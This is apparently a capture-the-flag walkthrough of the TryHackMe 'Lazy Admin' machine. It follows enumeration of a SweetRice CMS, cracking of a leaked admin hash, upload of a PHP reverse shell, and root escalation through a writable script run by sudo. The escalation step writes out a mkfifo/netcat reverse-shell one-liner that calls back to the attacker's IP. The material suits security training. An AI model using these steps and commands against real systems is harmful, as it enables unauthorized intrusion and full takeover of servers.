# Lazy Admin

This is for the *easy* difficulty Lazy Admin machine found at (https://tryhackme.com/room/lazyadmin)
_____________
## Recon and Enumeration

First we will start with basic nmap analysis of the machine. `nmap -T4 Lazy`

This reveals a couple of open ports 22 and 80.  Pretty typical ports.  Let's run a service scan as well.  `nmap -T4 -sV Lazy`

![Nmap](img/LazyAdmin/Nmap)

This reveals that the server is running a 2.4.18 version of Apache, and using 4ubuntu2.8 ssh.

Now let's start up a gobuster against the http domain to expedite our enumeration before we open the http page.

`gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 -u 10.10.210.228`

As expected and revealed by the scans, the basic page is the Ubuntu Default page for Apache2.  Let's see what gobuster found.

![Gobuster](img/LazyAdmin/Gobuster)

It looks like we found a /content directory.  That sounds juicy, let's investigate.

![Rice](img/LazyAdmin/Sweetrice)

And here we find that the content management system being installed is called SweetRice.  Let's poke around the page some.  Looking at the source for the page doesn't reveal much, but we can use gobuster on this directory as well to see what we can find.

![Gobuster2](img/LazyAdmin/gobuster2)

This gives us many more places to mess around, including attachment, images, inc, js, and as.

/as appears to lead to a signin page, while attachment appears to be remote file hosting.  Inc is much more boring, but it does contain some interesting data.  We can download a mysql backup to review in a bit.  Also latest.txt tells us that the CMS is version 1.5.1.  This is massive as it may give us insight into vulnerabilities we can take advantage of later.  Let's check against searchsploit.

![SearchingForAnswers](img/LazyAdmin/Searchsploit)

This shows us multiple cve for 1.5.1, including Backup Disclosure and some PHP Code Execution.  Let's see what's up with the Backup Disclosure first.  If we can get a foothold, we can potentially access all mysql backups from localhost.  That may be useful later.  Let's try the CSRF one next.
It will allow us to potentially get a shell another way later on, but appears to need admin.  

Let's cat out this sql backup and see what we can find.  

![SQL](img/LazyAdmin/SQL)

Looks like we have the admin username: manager and the password hash.  Before we can use it, we'll have to crack it, but before we can do that, we should figure out what kind of hash it is.  `hashid` is the function that saves lives in times like this.  Checking it gives us a few options, after trying them, it appears that it is a MD5 hash.  We add the hash to a file and check it with john using the following command:

`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

This provides the password for us to use.  We can try it on ssh, but it doesn't work :<  Luckily it does work with the admin portal, and we are now in!

![Admin](img/LazyAdmin/Sweetrice2)

_____________
## Initial Foothold
______________

Let's look around and see if we can take advantage of some of these vulnerabilities we looked at earlier. 

Or better yet, we can find a way to make a post and add in an attachment, this should be enough to give us a reverse shell as we can add a reverse shell script in and curl it down while listening to the port we have with netcat.  First let's upload the file.

![Post](img/LazyAdmin/AdminPost)

We just fill the forms for the post, that isn't the important part, but we add an attachment, for this I'm using the php-reverse-shell script.  Once that is added, I can go to the directory created, and find the script there.  

![Uploaded](img/LazyAdmin/Uploaded%20file)


Now we can set up netcat, I set the port to 443 but you can set it to anything you'd like.  I open a new shell and listen using the following command `sudo nc -lvnp 443` then curl down the file we uploaded, which initiates the php and creates the shell connection.  

______________
## Privilege Escalation
_______________

![Foothold](img/LazyAdmin/Initial%20Foothold)
We're finally in.  Looking for user.txt finds it in a user called `itguy`'s account, but we don't have permissions to get in.  First things first: let's stabilize the shell.  `python -c 'import pty; pty.spawn("/bin/sh")'` should take care of that. Now let's see if we can find anything we can run as sudo.  

Sudo -l reveals that we can run `/usr/bin/perl /home/itguy/backup.pl` as sudo without a password.  This should get us in as itguy.  Let's see if we can adjust the perl script at all.

It appears to spawn a shell and run copy.sh, let's check that file.  

`ls -la | grep 'copy.sh'` reveals that all have rwx permissions.  Let's edit this to spawn in a root shell.  It already appears to nc in a shell, so we just need to set the right ip and port.  Time to finish this.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.46.115 443 >/tmp/f > /etc/copy.sh`

This successfully writes to the file.  We can now start up a second nc connection then run the command listed by sudo -l.  When we run this command we now see that we are root!

![Root](img/LazyAdmin/Root)

We can now find the user.txt in /home/itguy and root in /root, finishing the box.

